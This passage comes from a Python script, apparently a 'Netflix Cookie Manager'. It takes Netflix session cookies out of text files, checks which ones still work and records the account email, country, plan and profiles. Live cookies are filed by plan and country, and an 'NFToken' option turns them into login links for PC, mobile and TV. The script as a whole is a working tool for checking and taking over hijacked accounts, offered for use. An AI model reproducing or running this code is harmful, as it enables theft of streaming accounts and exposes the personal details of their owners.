                    if os.path.isdir(full_path):
                        folders.append(item)
                    elif item.lower().endswith('.txt'):
                        files.append(item)
            except:
                pass
            
            print(f"\n{Colors.CYAN}📁 Folders:{Colors.END}")
            if folders:
                for i, folder in enumerate(folders, 1):
                    print(f"  {Colors.GREEN}{i}.{Colors.END} 📁 {folder}")
            else:
                print(f"  {Colors.GRAY}(none){Colors.END}")
            
            print(f"\n{Colors.CYAN}📄 .txt Files:{Colors.END}")
            if files:
                for i, f in enumerate(files, len(folders) + 1):
                    print(f"  {Colors.GREEN}{i}.{Colors.END} 📄 {f}")
            else:
                print(f"  {Colors.GRAY}(none){Colors.END}")
            
            print(f"\n{Colors.GRAY}{'─'*60}{Colors.END}")
            print(f"  {Colors.YELLOW}all{Colors.END}   → 📦 Process ALL .txt files in this folder")
            print(f"  {Colors.YELLOW}0{Colors.END}     → ⬅️  Back")
            
            print(f"{Colors.GRAY}{'─'*60}{Colors.END}")
            
            choice = input(f"\n{Colors.YELLOW}👉 Select (number/name/all/0): {Colors.END}").strip().lower()
            
            if choice == '0':
                if current_path != "/storage/emulated/0/Download":
                    current_path = os.path.dirname(current_path)
                    continue
                else:
                    return None
            
            if choice == 'all':
                if files:
                    return [os.path.join(current_path, f) for f in files]
                else:
                    print(f"\n{Colors.RED}❌ No .txt files in this folder{Colors.END}")
                    time.sleep(1.5)
                    continue
            
            if choice.isdigit():
                idx = int(choice)
                if 1 <= idx <= len(folders):
                    current_path = os.path.join(current_path, folders[idx - 1])
                    continue
                elif len(folders) < idx <= len(folders) + len(files):
                    file_idx = idx - len(folders) - 1
                    return [os.path.join(current_path, files[file_idx])]
                else:
                    print(f"{Colors.RED}❌ Invalid number{Colors.END}")
                    time.sleep(1)
            elif choice:
                # Try folder name
                full_path = os.path.join(current_path, choice)
                if os.path.isdir(full_path):
                    current_path = full_path
                    continue
                elif os.path.isfile(full_path) and choice.lower().endswith('.txt'):
                    return [full_path]
                else:
                    print(f"{Colors.RED}❌ Not found: {choice}{Colors.END}")
                    time.sleep(1)
    
    # ==================== OPTION 2: TV2 LOGIN + NFToken ====================
    
    def tv2_login(self):
        self.clear_screen()
        self.print_header()
        
        print(f"{Colors.BOLD}{Colors.YELLOW}🔗 TV2 LOGIN + NFToken GENERATOR{Colors.END}")
        print(f"{Colors.GRAY}{'─'*60}{Colors.END}")
        
        files = self.browse_for_file()
        if not files:
            return
        
        print(f"\n{Colors.GREEN}📄 Processing {len(files)} file(s){Colors.END}")
        print(f"{Colors.GRAY}{'─'*60}{Colors.END}")
        
        for idx, file_path in enumerate(files, 1):
            original_filename = os.path.basename(file_path)
            print(f"\n{Colors.GRAY}[{idx}/{len(files)}] {original_filename}{Colors.END}")
            
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
            except Exception as e:
                print(f"{Colors.RED}❌ Error reading file{Colors.END}")
                continue
            
            cookies = self.extractor.extract_from_text(content)
            if not cookies:
                print(f"{Colors.RED}❌ No Netflix cookies found{Colors.END}")
                continue
            
            print(f"  {Colors.GREEN}✅ Cookies extracted{Colors.END}")
            
            # Get details for filename
            temp_checker = CookieChecker()
            is_alive, plan, details = temp_checker.check_cookie(cookies)
            
            if not is_alive:
                print(f"  {Colors.RED}❌ Login failed - cookies invalid{Colors.END}")
                continue
            
            email = details.get('email', '')
            member_since_raw = details.get('member_since_raw', None)
            
            if email:
                email_prefix = email.split('@')[0] if '@' in email else email
                email_prefix = re.sub(r'[^\w\-]', '_', email_prefix)[:20]
            else:
                email_prefix = 'unknown'
            
            if member_since_raw:
                month, day = member_since_raw
                month_short = MONTH_SHORT.get(month, 'jan')
                filename = f"{email_prefix}-{month_short}-{day}.txt"
            else:
                filename = f"{email_prefix}.txt"
            
            print(f"  📧 Email: {email}")
            print(f"  📄 Filename: {filename}")
            
            # Generate NFToken
            result = self.token_generator.login_and_generate(cookies)
            
            if not result['success']:
                print(f"  {Colors.RED}❌ NFToken failed{Colors.END}")
                continue
            
            # Save
            os.makedirs(NFTOKEN_PATH, exist_ok=True)
            output_path = os.path.join(NFTOKEN_PATH, filename)
            
            lines = [
                f"PC: {result['pc_link']}",
                f"Mobile: {result['mobile_link']}",
                f"TV: {result['tv_link']}",
            ]
            
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write("\n".join(lines))
            
            print(f"  {Colors.GREEN}✅ SAVED: {filename}{Colors.END}")
        
        print(f"\n{Colors.GRAY}{'─'*60}{Colors.END}")
        print(f"{Colors.GREEN}✅ All processed!{Colors.END}")
        print(f"  📁 Folder: {NFTOKEN_PATH}")
        
        input(f"\n{Colors.CYAN}Press Enter...{Colors.END}")
    
    # ==================== OPTION 1: EXTRACT + CHECK ====================
    
    def extract_and_check(self):
        self.clear_screen()
        self.print_header()
        
        print(f"{Colors.BOLD}{Colors.YELLOW}🚀 EXTRACT + CHECK{Colors.END}")
        print(f"{Colors.GRAY}{'─'*60}{Colors.END}")
        
        files = self.browse_for_file()
        if not files:
            return
        
        print(f"\n{Colors.GREEN}📄 Processing {len(files)} file(s){Colors.END}")
        print(f"{Colors.GRAY}{'─'*60}{Colors.END}")
        
        self.checker = CookieChecker()
        
        for i, filepath in enumerate(files, 1):
            filename = os.path.basename(filepath)
            print(f"\n{Colors.GRAY}[{i}/{len(files)}] {filename}{Colors.END}")
            
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
            except Exception as e:
                self.checker.stats['errors'] += 1
                print(f"  {Colors.RED}❌ Error reading{Colors.END}")
                continue
            
            cookies = self.extractor.extract_from_text(content, verbose=False)
            if not cookies:
                self.checker.stats['errors'] += 1
                print(f"  {Colors.RED}❌ No Netflix cookies found{Colors.END}")
                continue
            
            self.checker.stats['total'] += 1
            print(f"     🔍 Checking...", end=" ")
            is_alive, plan, details = self.checker.check_cookie(cookies)
            
            if is_alive:
                self.checker.stats['alive'] += 1
                plan = plan or 'unknown'
                self.checker.stats['plans'][plan] = self.checker.stats['plans'].get(plan, 0) + 1
                
                country = details.get('country', 'XX')
                if not country or country == 'N/A':
                    country = 'XX'
                
                plan_folder = PLAN_FOLDERS.get(plan, PLAN_FOLDERS['unknown'])
                country_folder = os.path.join(plan_folder, country.upper())
                os.makedirs(country_folder, exist_ok=True)
                
                email = details.get('email', '')
                member_since_raw = details.get('member_since_raw', None)
                
                if email:
                    email_prefix = email.split('@')[0] if '@' in email else email
                    email_prefix = re.sub(r'[^\w\-]', '_', email_prefix)[:20]
                else:
                    email_prefix = 'unknown'
                
                if member_since_raw:
                    month, day = member_since_raw
                    month_short = MONTH_SHORT.get(month, 'jan')
                    output_name2 = f"{email_prefix}-{month_short}-{day}.txt"
                else:
                    output_name2 = f"{email_prefix}.txt"
                
                output_path2 = os.path.join(country_folder, output_name2)
                
                plan_display = details.get('plan_name', 'N/A')
                if plan_display == 'N/A' or plan_display == '':
                    streams = details.get('streams', '')
                    if streams == '4':
                        plan_display = 'Premium'
                    elif streams == '2':
                        plan_display = 'Standard'
                    elif streams == '1':
                        plan_display = 'Basic'
                    else:
                        plan_display = 'Unknown'
                
                profiles = details.get('profiles', [])
                if profiles:
                    profiles_formatted = ', '.join([f"{i+1}. {p}" for i, p in enumerate(profiles)])
                else:
                    profiles_formatted = 'N/A'
                
                lines = [
                    "#" + "="*60,
                    f"# NETFLIX COOKIE - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                    f"# Plan: {plan.title() if plan else 'Unknown'}",
                    "#" + "="*60,
                    "",
                    "# ==================== ACCOUNT DETAILS ====================",
                    f"# Email: {details.get('email', 'N/A')}",
                    f"# Country: {details.get('country', 'N/A')}",
                    f"# Member Since: {details.get('member_since', 'N/A')}",
                    f"# Streams: {details.get('streams', 'N/A')}",
                    f"# Plan Name: {plan_display}",
                    f"# Profiles: {profiles_formatted}",
                    "#" + "="*60,
                    "",
                    "# ==================== NETSCAPE COOKIES ====================",
                    content.strip(),
                    "#" + "="*60
                ]
                
                with open(output_path2, 'w', encoding='utf-8') as f:
                    f.write("\n".join(lines))
                
                print(f"{Colors.GREEN}✅ ALIVE{Colors.END}")
                
                if details.get('email'):
                    print(f"     📧 Email: {details['email']}")
                if details.get('country'):
                    print(f"     🌍 Country: {details['country']}")
                if details.get('member_since'):
                    member_since_clean = re.sub(r',?\s*\d{4}', '', details['member_since']).strip()
                    print(f"     📅 Member Since: {member_since_clean}")
                if details.get('streams'):
                    print(f"     📺 Streams: {details['streams']}")
                if plan_display:
                    print(f"     📦 Plan: {plan_display}")
                if profiles:
                    print(f"     👤 Profiles: {profiles_formatted}")
                else:
                    print(f"     👤 Profiles: N/A")
                print(f"     📄 Saved as: {output_name2}")
            else:
                self.checker.stats['dead'] += 1
                print(f"{Colors.RED}❌ DEAD (not saved){Colors.END}")
        
        print(f"\n{Colors.GRAY}{'─'*60}{Colors.END}")
        print(f"{Colors.GREEN}✅ Alive: {self.checker.stats['alive']}{Colors.END}")
        print(f"{Colors.RED}❌ Dead: {self.checker.stats['dead']}{Colors.END}")
        print(f"{Colors.YELLOW}⚠️ Errors: {self.checker.stats['errors']}{Colors.END}")
        
        if self.checker.stats['plans']:
            print(f"\n{Colors.CYAN}📋 Plan Distribution:{Colors.END}")
            for plan, count in sorted(self.checker.stats['plans'].items()):
                icon = {
                    'premium': '⭐',
                    'standard': '📺',
                    'standard_with_ads': '📺',
                    'basic': '📱',
                    'mobile': '📱',
                    'free': '🆓',
                    'unknown': '❓'
                }.get(plan, '📁')
                print(f"  {icon} {plan.title()}: {count}")
        
        print(f"\n{Colors.CYAN}📁 Alive cookies: {ALIVE_PATH}/[plan]/[country]/{Colors.END}")
        
        input(f"\n{Colors.CYAN}Press Enter...{Colors.END}")
    
    def exit_app(self):
        self.clear_screen()
        print(f"{Colors.BOLD}{Colors.GREEN}")
        print("="*60)
        print("  🚪 Thank you for using Netflix Cookie Manager!")
        print(f"  📁 Cookies saved in: {BASE_PATH}")
        print("="*60)
        print(f"{Colors.END}")
        self.is_running = False
        sys.exit(0)

# ==================== MAIN ====================

def main():
    try:
        ui = UI()
        ui.run()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠️ Interrupted{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}❌ Error: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()
